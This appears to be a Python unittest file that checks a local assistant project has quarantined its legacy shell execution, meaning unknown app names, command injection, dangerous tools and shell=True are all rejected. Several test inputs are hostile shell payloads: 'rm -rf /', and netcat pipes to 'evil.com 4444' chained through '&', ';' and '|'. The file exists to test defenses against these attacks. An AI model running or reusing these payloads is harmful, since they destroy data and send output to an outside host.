"""MVP-P0-A: Legacy execution quarantine proof tests.

These tests verify that legacy arbitrary shell execution is quarantined
from all reachable paths. They are RED before GREEN implementation and
GREEN after.
"""

import json
import re
import sys
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))


class QuarantineWindowsOpenAppTests(unittest.TestCase):
    """modules/windows.py open_app must deny unknown identifiers."""

    def test_unknown_open_app_rejected(self):
        from modules.windows import open_app
        with self.assertRaises(ValueError) as ctx:
            open_app("evil_app_that_does_not_exist")
        self.assertIn("unknown application identifier", str(ctx.exception))

    def test_shell_metacharacters_rejected(self):
        from modules.windows import open_app
        with self.assertRaises(ValueError) as ctx:
            open_app("calc & whoami")
        self.assertIn("unknown application identifier", str(ctx.exception))

    def test_empty_app_rejected(self):
        from modules.windows import open_app
        with self.assertRaises(ValueError) as ctx:
            open_app("")
        self.assertIn("unknown application identifier", str(ctx.exception))

    def test_semicolon_injection_rejected(self):
        from modules.windows import open_app
        with self.assertRaises(ValueError) as ctx:
            open_app("notepad; rm -rf /")
        self.assertIn("unknown application identifier", str(ctx.exception))

    def test_pipe_injection_rejected(self):
        from modules.windows import open_app
        with self.assertRaises(ValueError) as ctx:
            open_app("calc | nc evil.com 4444")
        self.assertIn("unknown application identifier", str(ctx.exception))

    @patch("modules.windows.subprocess.Popen")
    def test_known_app_uses_list_form(self, mock_popen):
        from modules.windows import open_app
        mock_popen.return_value = MagicMock()
        open_app("calc")
        mock_popen.assert_called_once()
        args = mock_popen.call_args
        cmd = args[0][0] if args[0] else args[1].get("args")
        self.assertIsInstance(cmd, list)
        self.assertNotIn("shell", args[1] if len(args) > 1 else {})
        if len(args) > 1 and "shell" in args[1]:
            self.assertFalse(args[1]["shell"])

    @patch("modules.windows.subprocess.Popen")
    def test_known_app_explorer_uses_list_form(self, mock_popen):
        from modules.windows import open_app
        mock_popen.return_value = MagicMock()
        open_app("explorer")
        mock_popen.assert_called_once()
        args = mock_popen.call_args
        cmd = args[0][0] if args[0] else args[1].get("args")
        self.assertIsInstance(cmd, list)


class QuarantineSelfEditTests(unittest.TestCase):
    """modules/self_edit.py _run_tests must reject model-controlled commands."""

    def test_arbitrary_command_rejected(self):
        from modules.self_edit import _run_tests
        success, output = _run_tests(["rm -rf /"], [])
        self.assertFalse(success)
        self.assertIn("rejected", output.lower())

    def test_shell_injection_rejected(self):
        from modules.self_edit import _run_tests
        success, output = _run_tests(["python -m py_compile foo.py & whoami"], [])
        self.assertFalse(success)
        self.assertIn("rejected", output.lower())

    def test_pipe_injection_rejected(self):
        from modules.self_edit import _run_tests
        success, output = _run_tests(["python -m py_compile foo.py | nc evil.com 4444"], [])
        self.assertFalse(success)
        self.assertIn("rejected", output.lower())

    def test_valid_py_compile_accepted(self):
        from modules.self_edit import _run_tests
        success, output = _run_tests(["python -m py_compile modules/files.py"], [])
        self.assertTrue(success)

    def test_empty_tests_accepted(self):
        from modules.self_edit import _run_tests
        success, output = _run_tests([], [])
        self.assertTrue(success)


class QuarantineExecutorTests(unittest.TestCase):
    """core/executor.py must block dangerous tools when quarantine is active."""

    def test_quarantine_blocks_windows(self):
        from core.executor import execute
        result = execute({"tool": "windows", "action": "open_app", "app": "calc"})
        self.assertIn("quarantined", result.lower())

    def test_quarantine_blocks_self_edit(self):
        from core.executor import execute
        result = execute({"tool": "self_edit", "action": "auto_edit", "goal": "test"})
        self.assertIn("quarantined", result.lower())

    def test_quarantine_blocks_automation(self):
        from core.executor import execute
        result = execute({"tool": "automation", "action": "run"})
        self.assertIn("quarantined", result.lower())

    def test_quarantine_blocks_browser(self):
        from core.executor import execute
        result = execute({"tool": "browser", "action": "navigate"})
        self.assertIn("quarantined", result.lower())

    def test_quarantine_blocks_operator(self):
        from core.executor import execute
        result = execute({"tool": "operator", "action": "run"})
        self.assertIn("quarantined", result.lower())

    def test_quarantine_blocks_code(self):
        from core.executor import execute
        result = execute({"tool": "code", "action": "generate"})
        self.assertIn("quarantined", result.lower())

    def test_none_tool_still_works(self):
        from core.executor import execute
        result = execute({"tool": "none", "text": "OK"})
        self.assertEqual(result, "OK")

    def test_empty_plan_still_works(self):
        from core.executor import execute
        result = execute(None)
        self.assertIn("пустой план", result)


class QuarantineManifestTests(unittest.TestCase):
    """Packaging manifest must not expose legacy console as MVP entrypoint."""

    def test_manifest_excludes_legacy_app_v5(self):
        manifest_path = REPO_ROOT / "localcomet_runtime_manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        entrypoints = manifest.get("entrypoints", [])
        self.assertNotIn("next/app_v5.py", entrypoints)

    def test_manifest_excludes_legacy_app(self):
        manifest_path = REPO_ROOT / "localcomet_runtime_manifest.json"
        manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        entrypoints = manifest.get("entrypoints", [])
        self.assertNotIn("app.py", entrypoints)


class QuarantineSourceInvariantTests(unittest.TestCase):
    """Source-level invariant: no shell=True in quarantined modules."""

    def test_no_shell_true_in_windows_module(self):
        source = (REPO_ROOT / "modules" / "windows.py").read_text(encoding="utf-8")
        self.assertNotIn("shell=True", source)

    def test_no_shell_true_in_self_edit_run_tests(self):
        source = (REPO_ROOT / "modules" / "self_edit.py").read_text(encoding="utf-8")
        self.assertNotIn("shell=True", source)


if __name__ == "__main__":
    unittest.main()
